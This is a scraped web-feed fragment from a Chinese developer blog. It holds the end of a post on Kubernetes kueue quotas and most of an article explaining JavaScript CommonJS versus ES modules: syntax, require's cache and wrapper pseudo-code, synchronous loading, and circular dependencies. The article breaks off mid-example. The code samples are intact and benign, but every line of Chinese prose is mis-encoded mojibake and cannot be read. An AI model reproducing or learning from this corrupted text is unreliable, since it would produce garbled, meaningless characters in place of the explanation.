<p>kueueèµ„æºæ± çš„é…é¢çº¦æŸäº†æŸäº›ç»†ç²’åº¦è¦æ±‚çš„èµ„æºæ± çš„é€»è¾‘è¾¹ç•Œï¼Œé€šè¿‡resourceFalvoræŠ½è±¡å‡ºèµ„æºæ± çš„æ¦‚å¿µï¼Œ kueueé€šè¿‡â€æ’é˜Ÿâ€œè¿™ä¸ªæ¦‚å¿µç»†åŒ–äº†å‡†å…¥è¿™ä¸ªåŠ¨ä½œï¼Œåœ¨kube-schedulerå·¥ä½œå‰ç®¡æ§äº†æ‰¹å¤„ç†ä»»åŠ¡çš„è°ƒåº¦ã€‚</p>
<ul>
<li><a href="https://juejin.cn/post/7327353547313053723#heading-9" target="_blank" title="https://juejin.cn/post/7327353547313053723#heading-9">juejin.cn/post/732735â€¦</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.infracloud.io%2Fblogs%2Fbatch-scheduling-on-kubernetes%2F" target="_blank" title="https://www.infracloud.io/blogs/batch-scheduling-on-kubernetes/" ref="nofollow noopener noreferrer">www.infracloud.io/blogs/batchâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ JavaScript æ¨¡å—ç³»ç»Ÿï¼šCJS ä¸ ESM çš„å®ç°åŸç†]]></title>    <link>https://juejin.cn/post/7582854603061674026</link>    <guid>https://juejin.cn/post/7582854603061674026</guid>    <pubDate>2025-12-13T16:11:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582854603061674026" data-draft-id="7583139562751852586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ JavaScript æ¨¡å—ç³»ç»Ÿï¼šCJS ä¸ ESM çš„å®ç°åŸç†"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-13T16:11:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¸©å®‡é£"/> <meta itemprop="url" content="https://juejin.cn/user/4300945219403368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ JavaScript æ¨¡å—ç³»ç»Ÿï¼šCJS ä¸ ESM çš„å®ç°åŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4300945219403368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¸©å®‡é£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T16:11:28.000Z" title="Sat Dec 13 2025 16:11:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ çœŸçš„ç†è§£ <code>require</code> å’Œ <code>import</code> çš„åŒºåˆ«å—ï¼Ÿä¸åªæ˜¯è¯­æ³•ä¸åŒï¼Œå®ƒä»¬çš„åŠ è½½æ—¶æœºã€å€¼çš„ä¼ é€’æ–¹å¼ã€å¾ªç¯ä¾èµ–å¤„ç†éƒ½æˆªç„¶ä¸åŒã€‚æœ¬æ–‡é€šè¿‡ <code>require</code> æºç å’Œ ESM è§„èŒƒï¼Œè§£é‡Šè¿™äº›å·®å¼‚èƒŒåçš„å®ç°æœºåˆ¶ï¼Œè®©ä½ å½»åº•ææ‡‚ JavaScript æ¨¡å—ç³»ç»Ÿçš„è¿è¡ŒåŸç†ã€‚</p>
<h2 data-id="heading-0">æ¨¡å—åŒ–çš„æ¼”è¿›</h2>
<p>JavaScript æœ€åˆä¸ºæµè§ˆå™¨è„šæœ¬è¯­è¨€ï¼Œæ²¡æœ‰æ¨¡å—ç³»ç»Ÿã€‚éšç€åº”ç”¨è§„æ¨¡å¢é•¿ï¼Œå…¨å±€å˜é‡æ±¡æŸ“å’Œä»£ç ç»„ç»‡é—®é¢˜å‡¸æ˜¾ï¼Œå‚¬ç”Ÿäº†æ¨¡å—åŒ–æ–¹æ¡ˆã€‚</p>
<p><strong>å…¨å±€å˜é‡æ—¶ä»£</strong>ï¼šæ‰€æœ‰ä»£ç å…±äº«å…¨å±€ä½œç”¨åŸŸï¼Œå˜é‡å†²çªé¢‘å‘ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¤šä¸ªè„šæœ¬å®¹æ˜“äº§ç”Ÿå‘½åå†²çª</span>
<span class="hljs-keyword">var</span> data = <span class="hljs-string">"script1"</span>;
<span class="hljs-keyword">var</span> data = <span class="hljs-string">"script2"</span>; <span class="hljs-comment">// è¦†ç›–å‰ä¸€ä¸ª</span>
</code></pre>
<p><strong>IIFE æ¨¡å¼</strong>ï¼šåˆ©ç”¨å‡½æ•°ä½œç”¨åŸŸéš”ç¦»å˜é‡ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">var</span> <span class="hljs-title class_">Module</span> = (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">var</span> private = <span class="hljs-string">"private"</span>;
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">public</span>: <span class="hljs-string">"public"</span> };
})();
</code></pre>
<p><strong>CJS (2009)</strong>ï¼šNode.js é‡‡ç”¨ï¼ŒæœåŠ¡ç«¯æ¨¡å—è§„èŒƒã€‚</p>
<p><strong>AMD (2010)</strong>ï¼šRequireJS æ¨å¹¿ï¼Œæµè§ˆå™¨å¼‚æ­¥åŠ è½½æ–¹æ¡ˆã€‚</p>
<p><strong>ESM(2015)</strong>ï¼šECMAScript å®˜æ–¹æ ‡å‡†ï¼Œé™æ€ç»“æ„ã€‚</p>
<h2 data-id="heading-1">è¯­æ³•å¯¹æ¯”</h2>
<h3 data-id="heading-2">CJS è¯­æ³•</h3>
<p><strong>å¯¼å‡ºæ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. module.exports å¯¼å‡ºå¯¹è±¡</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"foo"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"1.0"</span> };

<span class="hljs-comment">// 2. module.exports å¯¼å‡ºå‡½æ•°</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {};

<span class="hljs-comment">// 3. module.exports å¯¼å‡ºç±»</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {};

<span class="hljs-comment">// 4. exports æ·»åŠ å±æ€§ï¼ˆexports æ˜¯ module.exports çš„å¼•ç”¨ï¼‰</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">name</span> = <span class="hljs-string">"foo"</span>;
<span class="hljs-built_in">exports</span>.<span class="hljs-property">version</span> = <span class="hljs-string">"1.0"</span>;

<span class="hljs-comment">// æ³¨æ„ï¼šç›´æ¥èµ‹å€¼ exports ä¼šæ–­å¼€å¼•ç”¨</span>
<span class="hljs-comment">// exports = {} // âŒ æ— æ•ˆ</span>
</code></pre>
<p><strong>å¯¼å…¥æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å¯¼å…¥æ•´ä¸ªæ¨¡å—</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>);

<span class="hljs-comment">// 2. è§£æ„å¯¼å…¥</span>
<span class="hljs-keyword">const</span> { name, version } = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>);

<span class="hljs-comment">// 3. åŠ¨æ€è·¯å¾„ï¼ˆè¿è¡Œæ—¶è®¡ç®—ï¼‰</span>
<span class="hljs-keyword">const</span> env = <span class="hljs-string">"production"</span>;
<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">`./config.<span class="hljs-subst">${env}</span>`</span>);

<span class="hljs-comment">// 4. æ¡ä»¶å¯¼å…¥</span>
<span class="hljs-keyword">if</span> (condition) {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>);
}
</code></pre>
<h3 data-id="heading-3">ESM è¯­æ³•</h3>
<p><strong>å¯¼å‡ºæ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å‘½åå¯¼å‡º (Named Export)</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> name = <span class="hljs-string">'foo'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {}

<span class="hljs-comment">// 2. æ‰¹é‡å‘½åå¯¼å‡º</span>
<span class="hljs-keyword">const</span> name = <span class="hljs-string">'foo'</span>;
<span class="hljs-keyword">const</span> version = <span class="hljs-string">'1.0'</span>;
<span class="hljs-keyword">export</span> { name, version };

<span class="hljs-comment">// 3. é‡å‘½åå¯¼å‡º</span>
<span class="hljs-keyword">export</span> { name <span class="hljs-keyword">as</span> moduleName };

<span class="hljs-comment">// 4. é»˜è®¤å¯¼å‡º (Default Export) - æ¯ä¸ªæ¨¡å—åªèƒ½æœ‰ä¸€ä¸ª</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {}
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {}
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> { <span class="hljs-attr">name</span>: <span class="hljs-string">'foo'</span> };

<span class="hljs-comment">// 5. æ··åˆå¯¼å‡ºï¼ˆå‘½å + é»˜è®¤ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> name = <span class="hljs-string">'foo'</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// 6. è½¬å‘å¯¼å‡º</span>
<span class="hljs-keyword">export</span> { name } <span class="hljs-keyword">from</span> <span class="hljs-string">'./other.js'</span>;
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./other.js'</span>;
<span class="hljs-keyword">export</span> { <span class="hljs-keyword">default</span> <span class="hljs-keyword">as</span> otherDefault } <span class="hljs-keyword">from</span> <span class="hljs-string">'./other.js'</span>;
</code></pre>
<p><strong>å¯¼å…¥æ–¹å¼</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. å¯¼å…¥å‘½åå¯¼å‡º</span>
<span class="hljs-keyword">import</span> { name, version } <span class="hljs-keyword">from</span> <span class="hljs-string">"./module.js"</span>;

<span class="hljs-comment">// 2. å¯¼å…¥å¹¶é‡å‘½å</span>
<span class="hljs-keyword">import</span> { name <span class="hljs-keyword">as</span> moduleName } <span class="hljs-keyword">from</span> <span class="hljs-string">"./module.js"</span>;

<span class="hljs-comment">// 3. å¯¼å…¥é»˜è®¤å¯¼å‡º</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MyModule</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./module.js"</span>;

<span class="hljs-comment">// 4. æ··åˆå¯¼å…¥</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">MyModule</span>, { name, version } <span class="hljs-keyword">from</span> <span class="hljs-string">"./module.js"</span>;

<span class="hljs-comment">// 5. å¯¼å…¥æ‰€æœ‰å‘½åå¯¼å‡ºä¸ºå‘½åç©ºé—´å¯¹è±¡</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Module</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./module.js"</span>;

<span class="hljs-comment">// 6. ä»…æ‰§è¡Œæ¨¡å—</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"./module.js"</span>;

<span class="hljs-comment">// 7. åŠ¨æ€å¯¼å…¥ï¼ˆå¯åœ¨ä»»æ„ä½ç½®ï¼Œè¿”å› Promiseï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"./module.js"</span>);
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-keyword">if</span> (condition) {
  <span class="hljs-keyword">import</span>(<span class="hljs-string">"./module.js"</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> {});
}
</code></pre>
<h2 data-id="heading-4">CJS åŠ è½½æœºåˆ¶</h2>
<p>CJS æ˜¯ Node.js å®ç°çš„æ¨¡å—ç³»ç»Ÿã€‚ä¸åŒäºè¯­è¨€å±‚é¢çš„ç‰¹æ€§ï¼ŒCJS æ˜¯ä¸€ä¸ª<strong>è¿è¡Œæ—¶æ¦‚å¿µ</strong>ï¼Œæ ¸å¿ƒæ˜¯ Node.js å†…ç½®çš„ <code>require</code> å‡½æ•°ã€‚ç†è§£ <code>require</code> çš„å®ç°åŸç†ï¼Œæœ‰åŠ©äºç†è§£ CJS çš„å„ç§ç‰¹æ€§ã€‚</p>
<h3 data-id="heading-5">require å®ç°åŸç†</h3>
<p><code>require</code> å‡½æ•°è´Ÿè´£åŠ è½½æ¨¡å—ï¼Œå†…éƒ¨ç»´æŠ¤ <code>require.cache</code> ç¼“å­˜å¯¹è±¡ã€‚ä¸‹é¢æ˜¯ç®€åŒ–çš„ä¼ªæºç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">require</span>(<span class="hljs-params">modulePath</span>) {
  <span class="hljs-comment">// 1. è§£æä¸ºç»å¯¹è·¯å¾„</span>
  <span class="hljs-keyword">const</span> absolutePath = <span class="hljs-built_in">require</span>.<span class="hljs-title function_">resolve</span>(modulePath);

  <span class="hljs-comment">// 2. æ£€æŸ¥ç¼“å­˜</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span>[absolutePath]) {
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span>[absolutePath].<span class="hljs-property">exports</span>;
  }

  <span class="hljs-comment">// 3. åˆ›å»º Module å¯¹è±¡</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = {
    <span class="hljs-attr">id</span>: absolutePath,
    <span class="hljs-attr">exports</span>: {},
    <span class="hljs-attr">loaded</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-comment">// ... å…¶ä»–å±æ€§</span>
  };

  <span class="hljs-comment">// 4. æå‰æ”¾å…¥ç¼“å­˜ï¼ˆå¤„ç†å¾ªç¯ä¾èµ–çš„å…³é”®ï¼‰</span>
  <span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span>[absolutePath] = <span class="hljs-variable language_">module</span>;

  <span class="hljs-comment">// 5. è¯»å–æ–‡ä»¶å†…å®¹</span>
  <span class="hljs-keyword">const</span> code = fs.<span class="hljs-title function_">readFileSync</span>(absolutePath, <span class="hljs-string">"utf8"</span>);

  <span class="hljs-comment">// 6. åŒ…è£…ä¸ºå‡½æ•°</span>
  <span class="hljs-keyword">const</span> wrapper = <span class="hljs-string">"(function (exports, require, module, __filename, __dirname) { "</span> + code + <span class="hljs-string">"\n});"</span>;

  <span class="hljs-comment">// 7. ç¼–è¯‘å¹¶æ‰§è¡Œ</span>
  <span class="hljs-keyword">const</span> compiledWrapper = vm.<span class="hljs-title function_">runInThisContext</span>(wrapper);
  compiledWrapper.<span class="hljs-title function_">call</span>(
    <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, <span class="hljs-comment">// this æŒ‡å‘ exports</span>
    <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>, <span class="hljs-comment">// å‚æ•° 1: exports</span>
    <span class="hljs-built_in">require</span>, <span class="hljs-comment">// å‚æ•° 2: require</span>
    <span class="hljs-variable language_">module</span>, <span class="hljs-comment">// å‚æ•° 3: module</span>
    absolutePath, <span class="hljs-comment">// å‚æ•° 4: __filename</span>
    path.<span class="hljs-title function_">dirname</span>(absolutePath) <span class="hljs-comment">// å‚æ•° 5: __dirname</span>
  );

  <span class="hljs-comment">// 8. æ ‡è®°ä¸ºå·²åŠ è½½</span>
  <span class="hljs-variable language_">module</span>.<span class="hljs-property">loaded</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-comment">// 9. è¿”å› module.exports</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>;
}

<span class="hljs-comment">// require.cache: ç¼“å­˜å¯¹è±¡</span>
<span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span> = {};

<span class="hljs-comment">// require.resolve: è§£æè·¯å¾„</span>
<span class="hljs-built_in">require</span>.<span class="hljs-property">resolve</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">modulePath</span>) {
  <span class="hljs-comment">// è§£æç®—æ³•ï¼šç›¸å¯¹è·¯å¾„ã€ç»å¯¹è·¯å¾„ã€node_modules æŸ¥æ‰¾ç­‰</span>
  <span class="hljs-keyword">return</span> absolutePath;
};
</code></pre>
<p>ä»ä¼ªæºç å¯ä»¥çœ‹å‡ºï¼Œ<code>require</code> åšäº†è¿™äº›äº‹ï¼šè§£æè·¯å¾„ã€æ£€æŸ¥ç¼“å­˜ã€åˆ›å»º Module å¯¹è±¡ã€æå‰æ”¾å…¥ç¼“å­˜ã€åŒ…è£…å¹¶æ‰§è¡Œä»£ç ã€è¿”å› <code>module.exports</code>ã€‚è¿™ç§è®¾è®¡å¸¦æ¥äº†ä»¥ä¸‹ç‰¹æ€§ã€‚</p>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html%23the-module-wrapper" target="_blank" title="https://nodejs.org/api/modules.html#the-module-wrapper" ref="nofollow noopener noreferrer">Node.js Modules: The module wrapper</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html%23requireid" target="_blank" title="https://nodejs.org/api/modules.html#requireid" ref="nofollow noopener noreferrer">Node.js Modules: require</a></p>
</blockquote>
<h3 data-id="heading-6">åŒæ­¥æ‰§è¡Œï¼Œä¸æ”¯æŒ top-level await</h3>
<p>ä»ä¼ªæºç çš„ç¬¬ 5 æ­¥å¯ä»¥çœ‹åˆ°ï¼Œ<code>require</code> ä½¿ç”¨ <code>fs.readFileSync</code> åŒæ­¥è¯»å–æ–‡ä»¶ï¼Œä¼šé˜»å¡ä»£ç ç›´åˆ°æ¨¡å—åŠ è½½å®Œæˆã€‚ç”±äº CJS æ¨¡å—ä»£ç è¢«åŒ…è£…åœ¨æ™®é€šå‡½æ•°ä¸­ï¼ˆé async å‡½æ•°ï¼‰ï¼Œå› æ­¤ä¸æ”¯æŒ top-level awaitã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// module.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"module æ‰§è¡Œ"</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"foo"</span> };

<span class="hljs-comment">// main.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¼€å§‹"</span>);
<span class="hljs-keyword">const</span> mod = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>); <span class="hljs-comment">// é˜»å¡ï¼Œç­‰å¾… module.js æ‰§è¡Œå®Œæˆ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ç»“æŸ"</span>, mod.<span class="hljs-property">name</span>);

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// å¼€å§‹</span>
<span class="hljs-comment">// module æ‰§è¡Œ</span>
<span class="hljs-comment">// ç»“æŸ foo</span>

<span class="hljs-comment">// âŒ CJS ä¸æ”¯æŒ top-level await</span>
<span class="hljs-comment">// await someAsyncFunction(); // SyntaxError: await is only valid in async functions</span>
</code></pre>
<h3 data-id="heading-7">å€¼æ‹·è´</h3>
<p>ä¼ªæºç çš„ç¬¬ 4 æ­¥å°† Module å¯¹è±¡æ”¾å…¥ç¼“å­˜ï¼Œç¬¬ 2 æ­¥æ£€æŸ¥ç¼“å­˜æ—¶ç›´æ¥è¿”å› <code>module.exports</code>ã€‚è¿™æ„å‘³ç€æ‰€æœ‰ <code>require</code> è¿”å›çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡å¼•ç”¨ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.js</span>
<span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">count</span>: count, <span class="hljs-comment">// å¯¼å‡ºæ—¶ count çš„å€¼ä¸º 0</span>
  <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
    count++;
  },
};

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> counter = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./counter"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-property">count</span>); <span class="hljs-comment">// 0</span>
counter.<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-property">count</span>); <span class="hljs-comment">// 0ï¼ˆå¯¹è±¡å±æ€§æœªå˜ï¼Œcount æ˜¯æ¨¡å—å†…éƒ¨å˜é‡ï¼‰</span>

<span class="hljs-comment">// other.js</span>
<span class="hljs-keyword">const</span> counter2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./counter"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter === counter2); <span class="hljs-comment">// trueï¼ˆåŒä¸€ä¸ªå¯¹è±¡ï¼‰</span>
</code></pre>
<h3 data-id="heading-8">å¾ªç¯ä¾èµ–å¤„ç†</h3>
<p>ä¼ªæºç çš„å…³é”®è®¾è®¡æ˜¯ç¬¬ 4 æ­¥ï¼š<strong>åœ¨æ¨¡å—ä»£ç æ‰§è¡Œå‰ï¼Œå°±å°† Module å¯¹è±¡æ”¾å…¥ç¼“å­˜</strong>ï¼ˆæ­¤æ—¶ <code>loaded: false</code>ï¼‰ã€‚è¿™ä½¿å¾—å¾ªç¯ä¾èµ–æ—¶ï¼ŒååŠ è½½çš„æ¨¡å—èƒ½æ‹¿åˆ°å‰ä¸€ä¸ªæ¨¡å—æœªå®Œæˆçš„ <code>exports</code>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// a.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a å¼€å§‹"</span>);
<span class="hljs-built_in">exports</span>.<span class="hljs-property">done</span> = <span class="hljs-literal">false</span>;
